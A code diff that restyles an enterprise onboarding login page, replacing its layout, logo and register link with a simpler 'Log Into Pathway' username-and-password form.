@@ -5,42 +5,31 @@
     <script src="components/middleman.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Enterprise Onboarding</title>
-    <link rel="stylesheet" href="../css/style.css"/>
+    <link rel="stylesheet" href="../css/boring_corporate.css"/>
 
 
 </head>
 <body>
-    <div class="container">
-        <div class="header_bar">
-            <a href="../hr/hr_interface.html" class="logo-link">
-                <img src="../enterprise_testlogo.png" alt="Enterprise Logo" class="logo"/>
-            </a>
-            <h2 class="header-title">Global Product Employee Manager</h2>
-        </div>
-        <div class="loginContainer">
-            <div class="loginControls active" id="login-form">
-                <form onsubmit="event.preventDefault(); showMeTheMoney();">
-                    <h1>Login</h1>
-                    <div class="input-box">
-                        <input type="text" placeholder="Username" id="user-input" required>
-                        <i class='bx bxs-user'></i>
-                    </div>
-                    <div class="input-box">
-                        <input type="password" id="password-input" placeholder="Password" required>
-                        <i class='bx bxs-lock-alt'></i>
-                    </div>
-                    <div class="remember-forgot">
-                        <label><input type="checkbox"> Remember me</label>
-                        <a href="#">Forgot Password?</a>
-                    </div>
-                    <button type="submit" class="btn">Login</button>
-                    <div class="register-link">
-                        <p>Don't have an account? <a href="#" onclick="Nothingburger('register-link')">Register</a></p>
-                    </div>
-                </form>
-            </div>
-            </div>
-        </div>
+    <div class="header_bar">
+        <img src="./res/Pathway_logo.png" alt="Pathway Logo" style="max-width: 120px;"/>
+        <h2 class="header-title"></h2>
     </div>
+    <div class="content">
+
+                <form onsubmit="event.preventDefault(); showMeTheMoney();">
+                    <div class="content">
+                        <h1>Log Into Pathway</h1>
+                        <div class="input-box">
+                    </div>
+                    <div class="toolboxInputForm">
+                        <input type="text" placeholder="Username" id="user-input" required>
+                       
+                    </div>
+                    <div class="toolboxInputForm">
+                        <input type="password" id="password-input" placeholder="Password" required>
+                    </div>
+                        <button type="submit" class="btn">Login</button>
+                    
+                </div>
 </body>
 </html>
